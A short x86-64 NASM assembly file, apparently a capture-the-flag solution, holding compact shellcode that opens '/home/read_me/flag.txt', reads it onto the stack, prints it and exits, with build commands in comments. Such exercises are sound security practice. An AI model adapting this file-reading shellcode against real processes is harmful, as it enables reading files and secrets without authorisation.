BITS 64
global  _start

_start:

sub rsp, 80

push 2
pop rax
lea rdi, [rel +filename]
xor esi, esi
xor edx, edx
syscall

push rax
pop rdi
xor eax, eax
mov rsi, rsp
push 70
pop rdx
syscall

push 1
pop rax
push 1
pop rdi
syscall

push 0x3c
pop rax
syscall

filename:
db "/home/read_me/flag.txt", 0

;nasm -felf64 -o sol.o sol.asm  
;ld -o sol sol.o
